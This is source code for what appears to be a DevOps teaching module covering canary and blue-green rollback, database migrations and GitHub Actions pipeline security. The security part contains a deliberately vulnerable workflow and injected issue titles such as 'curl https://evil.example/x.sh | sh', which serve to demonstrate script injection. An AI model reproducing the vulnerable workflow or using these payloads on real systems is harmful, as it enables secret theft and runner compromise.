      <p>🟢 <b>Deploy is not release.</b> A <b>deploy</b> puts code on servers. A <b>release</b> lets users see it. With a <b>feature flag</b> you deploy dark (flag off), turn it on for staff, then 1%, then everyone, and you can turn it off in seconds without a deploy. Flags are cheap rollback, but each one is a branch in your code: delete flags once a feature is fully on.</p>
      <p>🔵 <b>Automated rollback.</b> A good canary does not need a human watching. After each traffic step the pipeline waits a "bake" window, compares the canary's error rate and latency with the baseline (the old version), and decides: go on, hold, or roll back. A simple rule: roll back if the canary's errors exceed twice the baseline plus a small slack. The visualizer runs that rule.</p>
      <p>🔵 <b>Rollback is a deploy.</b> The fastest rollback re-deploys a previous, already-built, already-tested digest. This only works because you "build once": the old image still exists. Do not rebuild old source for a rollback; you will not get the same bytes. On Kubernetes, <code>kubectl rollout undo deployment/app</code> does it (Cloud & DevOps 13), and Argo Rollouts or Flagger automate canary analysis.</p>
      <p>🔵 <b>The database is the hard part.</b> You can switch code back in seconds, but you cannot switch a dropped column back. And during rolling or canary deploys, <b>old and new code run at the same time</b> against one database, so every schema change must work for both. The safe recipe is <b>expand / contract</b>:</p>
      ${H.table(['Step', 'Schema change', 'App behaviour', 'Safe to roll back?'], [
        ['1. Expand', 'add new nullable column <code>email_normalized</code>', 'old code ignores it', 'yes'],
        ['2. Deploy', '(no change)', 'new code writes <b>both</b> columns, reads the old one', 'yes'],
        ['3. Backfill', 'copy old data into the new column in small batches', 'same', 'yes'],
        ['4. Switch reads', '(no change)', 'new code reads the new column', 'yes (still writes both)'],
        ['5. Contract', 'drop old column (a later release, days after)', 'only new code exists', 'no: this is the point of no return']
      ])}
      <p>🔵 <b>Run migrations as their own pipeline step</b>, before the app deploy, under a concurrency lock, with a dry run that shows the SQL to reviewers. Never run them from application start-up on 20 instances at once, and never combine expand and contract in one release.</p>`,
    clues: [
      '"Zero-downtime deploy" → rolling or blue-green, with readiness checks so traffic reaches only ready instances',
      '"Instant rollback" → blue-green switch back, or canary weight to 0; or redeploy the previous digest',
      '"Limit the damage of a bad release" → canary with automated analysis (error rate and latency vs baseline)',
      '"Ship code before the feature is ready" → feature flag, trunk-based development; deploy dark',
      '"Rename a column without downtime" → expand / contract, never a single rename migration',
      '"The bad deploy was rolled back in 2 minutes" → immutable artifact, health-check-based rollback, practised runbook'
    ],
    code: [SH(BG_SCRIPT, 'Local blue-green lab with automatic rollback'), Y(MIGRATE_YAML, 'Migration job before deploy'), Y(ROLLBACK_YAML, 'One-click rollback workflow')],
    codeTitle: ['Blue-green on your laptop: switch and roll back', 'Migrate first, deploy second', 'Rollback by redeploying a known-good digest'],
    viz: [{
      title: 'Canary rollout with automatic rollback',
      input: 'canary: 3, 5, 31 | baseline: 2, 2, 3 | slack: 5',
      inputLabel: 'errors per 10,000 requests at steps 5%, 25%, 50%, 100% | baseline | slack',
      gen: function (input) {
        var m = String(input || '').match(/^\s*canary:\s*([\d,\s]*)\|\s*baseline:\s*([\d,\s]*)\|\s*slack:\s*(\d+)\s*$/i);
        if (!m) throw new Error('Format: canary: 3, 5, 9 | baseline: 2, 2, 2 | slack: 5');
        function nums(s) { return s.split(',').map(function (x) { return x.trim(); }).filter(Boolean).map(Number); }
        var c = nums(m[1]), b = nums(m[2]), slack = Number(m[3]);
        if (c.length !== b.length || c.length > 4) throw new Error('Give the same number of canary and baseline values (at most 4)');
        var frames = [], rows = [], rolled = false;
        function fr(narr, hl, ptrW) {
          return { narr: narr, parts: [
            { type: 'bars', label: 'traffic to the new version (%)', values: CANARY_WEIGHTS.slice(), texts: CANARY_WEIGHTS.map(function (w) { return w + '%'; }), hl: hl || {}, ptr: ptrW === undefined ? {} : one(ptrW, 'now') },
            { type: 'table', label: 'analysis results', columns: ['step', 'canary', 'baseline', 'allowed', 'verdict'], rows: rows.length ? rows.slice() : [['-', '', '', '', '']] }
          ] };
        }
        frames.push(fr('The new version is deployed next to the old one, with <b>0%</b> of traffic. The rule for each step: the canary may have up to <b>max(2 x baseline, baseline + ' + slack + ')</b> errors per 10,000 requests. Anything above that means roll back.'));
        var hl = {};
        for (var i = 0; i < c.length && !rolled; i++) {
          var allowed = Math.max(2 * b[i], b[i] + slack), ok = canaryStep(c[i], b[i], slack);
          frames.push(fr('Shift <b>' + CANARY_WEIGHTS[i] + '%</b> of real traffic to the canary and wait for the bake window (say 10 minutes), then compare error rates.', hl, i));
          rows.push([CANARY_WEIGHTS[i] + '%', c[i], b[i], allowed, ok ? 'OK' : 'ROLL BACK']);
          if (ok) { hl[i] = 'ok'; frames.push(fr('Canary errors <b>' + c[i] + '</b> against an allowance of <b>' + allowed + '</b>: <b class="c-g">healthy</b>. ' + (i < 3 ? 'Go to the next step.' : 'All steps passed.'), hl, i)); }
          else { hl[i] = 'bad'; rolled = true; frames.push(fr('Canary errors <b>' + c[i] + '</b> are above the allowance of <b>' + allowed + '</b>: <b class="c-r">unhealthy</b>. The pipeline sets the weight back to 0% by itself. Only ' + CANARY_WEIGHTS[i] + '% of users saw the problem, for about one bake window.', hl, i)); }
        }
        if (rolled) frames.push(fr('<b class="c-r">Rolled back.</b> The old version still serves 100%. The failed canary is kept for debugging and an alert goes to the team. No human had to be awake.', hl));
        else if (c.length === 4) frames.push(fr('<b class="c-g">Promoted.</b> 100% of traffic is on the new version. Keep the old version around for a short while so rollback stays instant.', hl));
        else frames.push(fr('<b>Still in progress.</b> The next step is ' + CANARY_WEIGHTS[c.length] + '%. Add its numbers to continue.', hl));
        return pad4(frames, 'Done.');
      }
    }],
    examples: [
      { title: 'Situation: a bad deploy rolled back in 2 minutes', html: `<p>14:02 a deploy goes out at 10% canary. 14:05 the error rate on the canary is 4% against 0.2% for the baseline, over the allowance. 14:05:30 the pipeline sets canary weight to 0 and pages the on-call. 14:07 users are back to normal; the incident is "minutes of 10% of traffic having errors". Why it worked: an immutable previous version was still running, health metrics were wired into the pipeline, and the rollback step was automatic and rehearsed. The follow-up is a blameless review, not a hunt for the person who pushed.</p>` },
      { title: 'A flag instead of a branch', html: `<p>Feature "new checkout" is merged to main daily, flag <code>checkout_v2</code> off. QA flips it on for staff accounts. Marketing wants it live on Tuesday: flip to 10%, watch conversion and errors, then 100%. A bug on Tuesday afternoon: flip to 0%, no deploy, no pipeline, 30 seconds. Afterwards the team deletes the flag and the old code path in a cleanup PR; a flag that lives for a year is tech debt with a switch.</p>` },
      { title: 'Readiness and health checks decide rolling safety', html: `<p>A rolling deploy is only as safe as its readiness check. If the app reports "ready" before it can reach its database, the rollout continues, replaces healthy old instances with broken new ones and takes the service down. Make <code>/ready</code> check real dependencies lightly, keep <code>/health</code> (liveness) cheap, and set a rollout limit such as max unavailable 0 and a timeout so a stuck rollout fails instead of hanging.</p>` },
      { title: 'Renaming a column the safe way', html: `<p>Task: rename <code>users.fullname</code> to <code>users.display_name</code>. Unsafe: one migration with <code>RENAME COLUMN</code>; during the rolling deploy old code queries a column that no longer exists. Safe: release 1 adds <code>display_name</code> and writes both; a batched backfill copies old rows; release 2 reads the new column; release 3, days later, drops <code>fullname</code>. Three small, individually reversible steps instead of one risky one.</p>` }
    ],
    deepDive: `<p>🟣 <b>Statistics of a canary.</b> With 5% traffic and low volume, a few errors can look like a spike or hide one. Use enough requests per step (hundreds to thousands), compare against the <b>same-time baseline</b> rather than a historical number, and judge several signals: error rate, latency percentiles (p95/p99), saturation and a business metric. Tools such as Argo Rollouts, Flagger and cloud load balancer weighted routing can do this analysis for you.</p>
      <p>🟣 <b>Blue-green details.</b> The switch is a router, DNS or load balancer target change. DNS switches are slow because of caching, so use a load balancer or service mesh. Sessions and websockets need draining, and both colours share the same database, so the same expand/contract rules apply. Keep the old colour idle for a while; it is your instant rollback.</p>
      <p>🟣 <b>Roll forward or back?</b> Rolling back is best when the cause is the new code and the data is compatible. If a destructive migration or a data-writing bug already ran, rolling back code can make things worse, and the right move is a quick fix forward. This is why migrations are separated, reversible where possible, and backups are tested.</p>
      <p>🟣 <b>Flag hygiene.</b> Give every flag an owner and an expiry. Evaluate flags server-side for anything security-related. Test both states in CI. Keep a kill-switch flag for risky integrations. Flag services (open-source or hosted) cache values, so a "global off" should have a documented propagation time.</p>
      <p>🟣 <b>Metrics for delivery health.</b> The four DORA measures: deployment frequency, lead time for changes, change failure rate and time to restore service. They tell you if a pipeline change helped; a faster pipeline with a higher failure rate is not an improvement.</p>`,
    aiEra: `<p>🤖 AI can draft a rollout plan, a runbook, or the migration SQL, and it is easily over-confident about <b>reversibility</b>. Ask it to label each step "safe to roll back / not", then verify the point-of-no-return yourself. Be especially suspicious of a generated migration that renames, drops or changes a type in one step.</p>
      <p>🤖 AI-assisted operations tools can watch canary metrics and suggest rollbacks, but keep the final policy in code that you review (thresholds, bake time, who is paged). A rollback decision that nobody can explain after the incident is a liability.</p>`,
    problems: [P({
      t: 'Blue-green switch with a health check and automatic rollback', l: 'Medium', tags: ['blue-green', 'rollback', 'bash', 'health check'], co: ['Netflix', 'Amazon', 'HCL'],
      s: `<p>Two containers, <code>blue</code> (live) and <code>green</code> (new), run behind a router that reads the active colour from a one-line file. Write a bash function <code>deploy_switch NEW OLD</code> that: refuses to switch if NEW does not answer a health check; switches; waits 5 seconds; checks the public URL again; and switches back to OLD if the public check fails. It must exit non-zero on rollback so the pipeline is marked failed. Use <code>set -euo pipefail</code> and no hard-coded secrets.</p>`,
      ex: `<p>Green healthy and stays healthy → ${H.c('g', 'switched, exit 0')}. Green unhealthy before the switch → ${H.c('y', 'nothing changed, exit 1')}. Green healthy before but failing after → ${H.c('r', 'switched, rolled back, exit 1')}.</p>`,
      bw: `<p>Switch first, look later. With no pre-check there is a window where every user hits a broken app, and with no post-check nobody rolls back until a customer complains.</p>`,
      bc: SH(R`switch() { echo "$1" > /srv/active; nginx -s reload; }
switch green     # hope for the best`, 'naive: no checks'),
      q: ['Why check the new environment <b>before</b> sending it traffic as well as after?', ['Because a failure before the switch costs users nothing; only the after-check can catch problems that need real traffic', 'Because the after-check is optional', 'Because health checks are free', 'Because blue-green needs two checks by definition'], 0, 'The pre-check keeps broken builds away from users entirely. The post-check catches issues that only appear with real routing, and triggers the rollback.'],
      h: ['<p>Hint 1: write <code>healthy URL</code> as a small function using <code>curl -fsS --max-time 3</code>.</p>', '<p>Hint 2: with <code>set -e</code>, test commands inside <code>if</code> so a failed check does not exit the script by accident.</p>', '<p>Hint 3: remember the exit code: rollback is a failure for the pipeline even though the system recovered.</p>'],
      a: `<p>Check, switch, wait, check again, and undo on failure. The only state is the colour file, so both the deploy and the rollback are the same one-line operation. Exiting non-zero after a rollback keeps the pipeline honest.</p>`,
      code: SH(R`#!/usr/bin/env bash
set -euo pipefail

ACTIVE_FILE="\${ACTIVE_FILE:-/srv/active}"           # one line: blue or green
PUBLIC_URL="\${PUBLIC_URL:-http://localhost:8080/health}"

healthy() { curl -fsS --max-time 3 "$1" >/dev/null 2>&1; }
set_active() { echo "$1" > "$ACTIVE_FILE"; nginx -s reload; }

deploy_switch() {
  local new="$1" old="$2"
  if ! healthy "http://$new:8080/health"; then            # 1. never route to an unhealthy target
    echo "$new failed its pre-check: nothing changed" >&2
    return 1
  fi
  set_active "$new"                                       # 2. the switch is one line
  sleep 5                                                 # 3. let real traffic arrive
  if healthy "$PUBLIC_URL"; then                          # 4. check what users actually see
    echo "switched to $new"
    return 0
  fi
  echo "$new failed after the switch: rolling back to $old" >&2
  set_active "$old"                                       # 5. rollback is the same one-line operation
  return 1                                                # 6. the pipeline must still be marked failed
}

deploy_switch "$@"`, 'deploy_switch.sh'),
      cx: `<p>Constant work. Time to recover is the post-check delay plus a reload (a few seconds).</p>`,
      f: ['How would you extend the post-check to watch an error-rate metric for two minutes?', 'What changes if both colours share a database and the new version needs a schema change?']
    })]
  });

  // ───────────────────────── Topic 7: pipeline security ─────────────────────────
  var VULN = R`# DO NOT COPY: three classic mistakes in one file (shown so you can spot them in reviews)
name: triage-bot
on:
  issues:
    types: [opened]
  pull_request_target:                             # runs in the BASE repo context: has secrets and a write token
jobs:
  greet:
    runs-on: ubuntu-latest
    permissions: write-all                         # mistake 1: far more power than a greeting needs
    steps:
      - run: |                                                     # mistake 2: attacker-controlled text pasted into a script
          echo "New issue: @{{ github.event.issue.title }}"
      - uses: actions/checkout@v4
        with:
          ref: @{{ github.event.pull_request.head.sha }}            # mistake 3: checks out the attacker's code...
      - run: npm ci && npm test                                    # ...and runs it with secrets available
        env:
          DEPLOY_TOKEN: @{{ secrets.DEPLOY_TOKEN }}`;
  var SAFE = R`# The fixed version: data stays data, permissions are minimal, untrusted code never meets secrets
name: triage-bot
on:
  issues:
    types: [opened]
permissions:
  contents: read
jobs:
  greet:
    runs-on: ubuntu-latest
    permissions:
      issues: write                                # only what this job needs
    steps:
      - name: Greet
        env:
          TITLE: @{{ github.event.issue.title }}     # the expression is evaluated into an ENVIRONMENT VARIABLE...
          GH_TOKEN: @{{ github.token }}
          NUMBER: @{{ github.event.issue.number }}
        run: |
          # ...and the shell reads it as plain data. Quotes in the title cannot change the script.
          printf 'New issue: %s\n' "$TITLE"
          gh issue comment "$NUMBER" --repo "@{{ github.repository }}" --body "Thanks for the report!"`;
  var TWO_STAGE = R`# Safe pattern for PRs from forks: stage 1 runs untrusted code with NO secrets; stage 2 is trusted and only reads results.
# --- .github/workflows/pr-ci.yml (untrusted stage) ---
name: pr-ci
on:
  pull_request:                                    # fork PRs get a read-only token and no secrets
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - run: npm ci && npm test -- --reporter=json > result.json
      - uses: actions/upload-artifact@v4
        with:
          name: pr-result
          path: result.json
---
# --- .github/workflows/pr-comment.yml (trusted stage; never checks out or runs PR code) ---
name: pr-comment
on:
  workflow_run:
    workflows: [pr-ci]
    types: [completed]
permissions:
  actions: read
  pull-requests: write
jobs:
  comment:
    if: @{{ github.event.workflow_run.conclusion == 'success' }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: pr-result
          run-id: @{{ github.event.workflow_run.id }}
          github-token: @{{ github.token }}
      - name: Treat the artifact as untrusted data
        run: jq -r '.stats.failures' result.json`;
  var DEPREVIEW = R`# .github/workflows/dependency-review.yml: block PRs that add known-vulnerable or disallowed dependencies
name: dependency-review
on:
  pull_request:
permissions:
  contents: read
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high               # high and critical advisories fail the check`;
  var DEPENDABOT = R`# .github/dependabot.yml: weekly PRs that bump dependencies AND the pinned action SHAs
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    open-pull-requests-limit: 5`;
  var SUPPLY = R`# Build, then produce an SBOM and a signed provenance attestation for the image
name: supply-chain
on:
  push:
    tags: ['v*']
permissions:
  contents: read
jobs:
  image:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write                         # keyless signing uses OIDC
      attestations: write
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: @{{ github.actor }}
          password: @{{ secrets.GITHUB_TOKEN }}
      - id: push
        uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: ghcr.io/YOUR-ORG/app:@{{ github.ref_name }}
          sbom: true                          # SBOM: the ingredient list of the image
          provenance: mode=max                # provenance: where, how and from what source it was built
      - uses: actions/attest-build-provenance@v2   # pin to a full SHA in a real repo
        with:
          subject-name: ghcr.io/YOUR-ORG/app
          subject-digest: @{{ steps.push.outputs.digest }}
          push-to-registry: true`;
  var GITLEAKS = R`#!/usr/bin/env bash
# Local secret scanning, no account needed. Run before you push; also run it in CI.
set -euo pipefail

# Option 1: gitleaks in Docker, scanning the working repo and its history
docker run --rm -v "$PWD:/repo" ghcr.io/gitleaks/gitleaks:latest detect --source /repo --redact --verbose

# Option 2: block secrets BEFORE they are committed (a pre-commit hook)
cat > .git/hooks/pre-commit <<'HOOK'
#!/usr/bin/env bash
docker run --rm -v "$PWD:/repo" ghcr.io/gitleaks/gitleaks:latest protect --staged --source /repo --redact
HOOK
chmod +x .git/hooks/pre-commit

# If a real secret was ever committed: 1) REVOKE/rotate it now, 2) then clean history, 3) assume it was copied.
# Removing the line in a new commit does NOT remove it from history.
echo "scan complete"`;
  var VERIFY = R`#!/usr/bin/env bash
# Consumer side: only run an image whose provenance verifies (GitHub CLI, free)
set -euo pipefail
gh attestation verify "oci://ghcr.io/YOUR-ORG/app@sha256:0123abcd" --owner YOUR-ORG   # placeholder digest and owner
# Inspect the ingredient list that was attached at build time
docker buildx imagetools inspect ghcr.io/YOUR-ORG/app:v1.0.0 --format '{{ json .SBOM }}' | head -c 600`;

  topics.push({
    title: 'Pipeline Security: Least Privilege, Injection and the Supply Chain',
    analogy: `<p>A pipeline is a <b>robot with the keys to the building</b>: it can read your code, hold your passwords and open the production door. Anything that can steer the robot, a pull request, an issue title, a library it downloads, a helper it borrows, can use those keys. Pipeline security is therefore three habits: give the robot only the keys for <b>this</b> job (least privilege), never let strangers write its instructions (injection), and check where its tools came from (supply chain: ingredients list, tamper-proof seal).</p>`,
    explain: `<p>🟢 <b>Why pipelines are a favourite target.</b> One workflow often has: a write token, deployment credentials, and the ability to run arbitrary code. If an attacker gets their text or code into that workflow, they inherit all of it. Real incidents: a popular third-party action whose tags were moved to malicious code in 2025 and dumped secrets into public logs; fork PRs run through <code>pull_request_target</code> that leaked tokens; build dependencies swapped for look-alikes.</p>
      ${H.table(['Defence', 'What you do', 'Stops'], [
        ['Least-privilege token', 'top-level <code>permissions: contents: read</code>; grant <code>write</code> per job', 'a compromised step doing damage far beyond its job'],
        ['Pin actions to a full SHA', '<code>uses: org/action@&lt;40-char-sha&gt; # v4.1.0</code>, kept fresh by Dependabot', 'a moved or hijacked tag'],
        ['Use <code>pull_request</code>, not <code>pull_request_target</code>', 'fork code gets no secrets; if you must use the target trigger, never run PR code', 'secret theft from forks'],
        ['No expressions in scripts', 'put <code>@{{ ... }}</code> in <code>env:</code>, read as <code>"$VAR"</code>', 'script injection'],
        ['OIDC and environments', 'short-lived cloud credentials, reviewers on production', 'stolen long-lived keys'],
        ['Secret scanning', 'push protection, gitleaks pre-commit and CI', 'secrets committed by accident'],
        ['Dependency review, SBOM, provenance', 'block bad dependencies; list ingredients; sign what you built', 'poisoned dependencies and untraceable builds']
      ])}
      <p>🟢 <b>Script injection in plain words.</b> Writing <code>run: echo "@{{ github.event.issue.title }}"</code> makes GitHub paste the title into the script <i>before</i> the shell sees it. A title like <code>x"; curl evil | sh; echo "</code> turns into three commands. Fix: pass the value through an environment variable. The shell then reads a variable's value as data and never parses it as code.</p>
      <p>🔵 <b>pull_request_target, carefully.</b> It runs the workflow from the <b>base</b> branch, with secrets and a write-capable token, even for fork PRs. That is useful for labelling or commenting, but if the job checks out the PR's code and runs it (build, test, even <code>npm install</code> scripts), the attacker's code now holds your secrets. Rule: with <code>pull_request_target</code>, never check out or execute PR code. For testing fork PRs, use the two-stage pattern: untrusted <code>pull_request</code> with no secrets, then a trusted <code>workflow_run</code> that only reads the results as data.</p>
      <p>🔵 <b>Untrusted inputs to remember.</b> Issue and PR titles and bodies, comments, branch names (<code>github.head_ref</code>), commit messages, author names, artifacts from untrusted runs, and anything downloaded at build time.</p>
      <p>🔵 <b>Supply chain, intro level.</b> An <b>SBOM</b> (software bill of materials) is the list of ingredients in your artifact, so when a library is found vulnerable you can answer "are we affected?" in minutes. <b>Provenance</b> is a signed statement of how an artifact was built (which repo, commit and workflow). GitHub can create these with OIDC, and consumers can verify them with <code>gh attestation verify</code>. Frameworks like SLSA give levels for how strong your build guarantees are.</p>`,
    clues: [
      '"A contributor from a fork opened a PR and our token leaked" → <code>pull_request_target</code> plus checkout of PR code; switch to <code>pull_request</code> or the two-stage pattern',
      '"The issue title ran commands on our runner" → script injection via expression in <code>run:</code>; pass through <code>env:</code>',
      '"A third-party action was compromised" → pinned to a full commit SHA, Dependabot for updates, org-level allow-list of actions',
      '"Why not just use the default permissions?" → they may include write; set <code>permissions:</code> explicitly and the repo default to read-only',
      '"Can you prove this image was built from this commit?" → provenance attestation and signature, verified before deploy',
      '"A password was committed three weeks ago" → rotate immediately; history rewrite is secondary; enable push protection'
    ],
    code: [Y(VULN, 'Vulnerable workflow (do not copy)'), Y(SAFE, 'Fixed workflow'), Y(TWO_STAGE, 'Two-stage pattern for fork PRs'), Y(DEPREVIEW, 'Dependency review'), Y(DEPENDABOT, 'Dependabot config'), Y(SUPPLY, 'SBOM and provenance'), SH(GITLEAKS, 'Secret scanning locally'), SH(VERIFY, 'Verify provenance')],
    codeTitle: ['Spot the three mistakes', 'Fix: data stays data, minimal permissions', 'Test fork PRs without exposing secrets', 'Block risky dependencies on PRs', 'Keep pins and packages fresh', 'Attach an SBOM and signed provenance to an image', 'Find secrets before they ship', 'Check provenance before running an image'],
    viz: [{
      title: 'Script injection: what the shell really receives',
      input: 'Bug report"; curl https://evil.example/x.sh | sh; echo "',
      inputLabel: 'an attacker-controlled issue title',
      gen: function (input) {
        var title = String(input === undefined || input === null ? '' : input).replace(/\n/g, ' ');
        if (title.length > 120) throw new Error('Keep the title under 120 characters');
        var unsafeTpl = 'echo "New issue: ' + D2 + ' github.event.issue.title }}"';
        var rendered = 'echo "New issue: ' + title + '"';
        var risky = /["`;|&]|\$\(/.test(title);
        // naive split on the unquoted ; and | the way a shell would see commands after the injected quote closes the string
        var cmds = rendered.split(/;|\|/).map(function (s) { return s.trim(); }).filter(Boolean);
        var safeTpl = 'env:  TITLE: ' + D2 + ' github.event.issue.title }}\nrun:  printf \'%s\\n\' "$TITLE"';
        var frames = [];
        frames.push({ narr: 'Someone opens an issue. The title is <b>chosen by a stranger</b>. Your workflow has this step:', parts: [{ type: 'code', label: 'workflow step (unsafe)', lang: 'yaml', code: 'run: ' + unsafeTpl, hl: { 1: 'cur' } }, { type: 'text', label: 'attacker-controlled title', html: '<code>' + H.esc(title || '(empty)') + '</code>' }] });
        frames.push({ narr: 'Step 1: GitHub does a <b>text replacement</b> of the expression before any shell runs. The result is the script below.', parts: [{ type: 'code', label: 'script the runner writes to disk', lang: 'bash', code: rendered, hl: { 1: 'cur' } }] });
        frames.push({ narr: risky ? '<b class="c-r">Step 2: the shell parses it.</b> The quote or operator in the title ends the string early, so it sees ' + cmds.length + ' command(s): ' + cmds.map(function (c) { return '<code>' + H.esc(c) + '</code>'; }).join(', ') + '. Everything after the injected characters runs on your runner, with the job\'s token and secrets.' : '<b class="c-g">Step 2: the shell parses it.</b> This particular title has no quote, <code>;</code>, <code>|</code>, backtick or <code>$(</code>, so it stays inside the string and is harmless. The bug is still there; the next title may not be so polite.', parts: [{ type: 'table', label: 'commands the shell sees', columns: ['#', 'command'], rows: cmds.map(function (c, i) { return [i + 1, c]; }), hl: risky ? one(cmds.length - 1, 'bad') : {} }] });
        frames.push({ narr: '<b>The fix.</b> Evaluate the expression into an <b>environment variable</b>. The script text no longer contains the title at all; it only contains <code>"$TITLE"</code>.', parts: [{ type: 'code', label: 'fixed step', lang: 'yaml', code: safeTpl, hl: { 1: 'ok', 2: 'ok' } }] });
        frames.push({ narr: 'Now the runner starts the shell with <code>TITLE</code> set to the exact title. The shell expands <code>"$TITLE"</code> as <b>data</b> inside double quotes, so quotes and semicolons are just characters and nothing extra runs. Output: <code>New issue: ' + H.esc(title) + '</code>.', parts: [{ type: 'vars', label: 'environment of the step', vals: { TITLE: title || '(empty)' }, hl: { TITLE: 'ok' } }] });
        frames.push({ narr: 'Rule of thumb: <b>never put <code>&#36;{{ ... }}</code> with user-controlled text inside <code>run:</code></b> (or in <code>actions/github-script</code> code). Other risky contexts: <code>github.head_ref</code>, PR body, comment body, commit message.', parts: [{ type: 'set', label: 'untrusted fields', items: ['github.event.issue.title', 'github.event.issue.body', 'github.event.pull_request.title', 'github.event.comment.body', 'github.head_ref', 'github.event.head_commit.message'] }] });
        return frames;
      }
    }],
    examples: [
      { title: 'Situation: a leaked token from a fork PR', html: `<p>A repo used <code>pull_request_target</code> to "run tests with secrets so integration tests work for contributors". A stranger's PR changed <code>package.json</code> to add a <code>postinstall</code> script that sent <code>$DEPLOY_TOKEN</code> to their server. The token was valid for months. Fix in order: (1) revoke and rotate the token, (2) check the audit log for use, (3) switch to <code>pull_request</code> + the two-stage pattern, (4) replace the stored token with OIDC, (5) require approval for first-time contributor workflows in repo settings.</p>` },
      { title: 'Situation: a hijacked action tag', html: `<p>You wrote <code>uses: some-org/changed-files@v45</code>. The maintainer's account is compromised and tag <code>v45</code> is re-pointed to code that prints secrets. Every repo using the tag leaks on its next run. With <code>uses: some-org/changed-files@&lt;40-char-sha&gt; # v45.0.0</code> your workflow keeps running the old, reviewed commit until Dependabot proposes a bump that a human reviews. Pin <b>third-party</b> actions this way; first-party <code>actions/*</code> are lower risk but benefit too.</p>` },
      { title: 'Org and repo settings that back the YAML up', html: `<ul><li>Default workflow permissions: <b>read repository contents</b> only.</li><li>Allow only selected actions (GitHub-authored, verified creators, and an explicit list) and require full-length SHA pinning where available.</li><li>Require approval for workflow runs from first-time contributors.</li><li>CODEOWNERS on <code>.github/workflows/</code> so pipeline changes need a platform reviewer.</li><li>Secret scanning and push protection on; branch protection with required reviews.</li></ul>` },
      { title: 'Placeholders only', html: `<p>Every token, ARN, digest and domain in this module is a placeholder (<code>YOUR-ORG</code>, <code>123456789012</code>, <code>sha256:0123abcd</code>, <code>example.com</code>). In your own repos, put real values in GitHub secrets or variables, never in files, and never in screenshots or chat messages.</p>` }
    ],
    deepDive: `<p>🟣 <b>What masking does and does not do.</b> Secrets are replaced by asterisks in logs only when they appear verbatim. A step that prints <code>$SECRET | base64</code>, writes it to an artifact, or passes it to a third-party action defeats masking. Structured secrets (JSON blobs) must have each sensitive field registered or stored separately. Treat "secret in a log" as "secret leaked": rotate.</p>
      <p>🟣 <b>GITHUB_TOKEN in depth.</b> It is created per job and expires when the job ends. Its permissions are what you set. On fork PRs under <code>pull_request</code> it is read-only. Reusable workflows can only narrow it. Cache poisoning is another route: a PR in the same branch scope can write a cache that a later privileged job restores, so privileged jobs should not restore caches written by untrusted jobs.</p>
      <p>🟣 <b>Provenance and signing.</b> Keyless signing (Sigstore: Fulcio issues a short certificate tied to the OIDC identity, Rekor records it in a public log) means no private key to manage. The attestation says "this digest was built by workflow X in repo Y at commit Z". A deploy step can <b>verify before deploying</b>, which closes the "someone pushed an image by hand" gap. SLSA levels describe how hard it is to forge such a statement.</p>
      <p>🟣 <b>Self-hosted runner hygiene.</b> Ephemeral runners (one job, then destroyed), no public repos, a network segment without access to internal secrets, and no long-lived credentials on the box. A non-ephemeral runner keeps files between jobs, so one job's compromise can read the next job's checkout.</p>
      <p>🟣 <b>Detection.</b> Audit log streaming, alerts on new workflow files touching <code>pull_request_target</code> or <code>permissions: write-all</code>, and static analysers (<code>actionlint</code>, <code>zizmor</code>) in CI catch these bugs before merge.</p>`,
    aiEra: `<p>🤖 Assistants often produce exactly the unsafe patterns above: expressions inside <code>run:</code>, floating tags, <code>permissions: write-all</code> "to make it work", and <code>pull_request_target</code> with checkout of the head ref because that is what many blog posts show. Treat generated workflows like code from a stranger and run a linter such as <code>actionlint</code> and <code>zizmor</code> on them.</p>
      <p>🤖 There is also a new risk in the other direction: AI agents in the pipeline (a bot that reads an issue and edits code) are fed attacker-controlled text. That is the same injection problem, one level up. Give agent steps a minimal token, no secrets, and a human approval before anything is merged or deployed.</p>`,
    problems: [P({
      t: 'Fix the injection and the over-permissioned token', l: 'Medium', tags: ['security', 'script injection', 'permissions', 'github actions'], co: ['GitHub', 'Palo Alto Networks', 'Cisco'],
      s: `<p>This workflow labels new issues whose title mentions "crash". Find the security problems and rewrite it safely:</p><pre>on: issues
permissions: write-all
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: |
          if echo "&#36;{{ github.event.issue.title }}" | grep -qi crash; then
            gh issue edit &#36;{{ github.event.issue.number }} --add-label bug
          fi
        env:
          GH_TOKEN: &#36;{{ secrets.GITHUB_TOKEN }}</pre><p>Requirements: no expression containing user text inside <code>run:</code>; the token may only edit issues; the job is limited to 2 minutes.</p>`,
      ex: `<p>Title <code>crash"; curl evil | sh; "</code> → before: ${H.c('r', 'runs curl on your runner')}. After: ${H.c('g', 'just a string passed to grep, label added')}. Token attempts to push code → ${H.c('g', 'denied: only issues: write')}.</p>`,
      bw: `<p>"Sanitise" the title with a regex in YAML, or only fix the injection but keep <code>write-all</code>. Blacklists miss cases, and a broad token turns any future bug into a repository takeover.</p>`,
      bc: Y(R`on: issues
permissions: write-all
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: echo "@{{ github.event.issue.title }}" | grep -qi crash && gh issue edit @{{ github.event.issue.number }} --add-label bug`, 'vulnerable original'),
      q: ['Which is the safest way to give a script the issue title?', ['<code>env: TITLE: @{{ github.event.issue.title }}</code> and read <code>"$TITLE"</code>', 'Inline <code>@{{ github.event.issue.title }}</code> inside double quotes', 'Escape quotes with sed first', 'Inline it inside single quotes'], 0, 'With env, the title is never part of the script text, so no quoting trick can break out. Inline expressions are replaced before the shell parses the script, so quoting cannot protect you.'],
      h: ['<p>Hint 1: the problem is the expression inside <code>run:</code>. Move it to <code>env:</code>.</p>', '<p>Hint 2: <code>permissions:</code> for this job needs just <code>issues: write</code> (and nothing else).</p>', '<p>Hint 3: <code>timeout-minutes: 2</code> on the job; use <code>grep -qi -- crash</code> on the variable.</p>'],
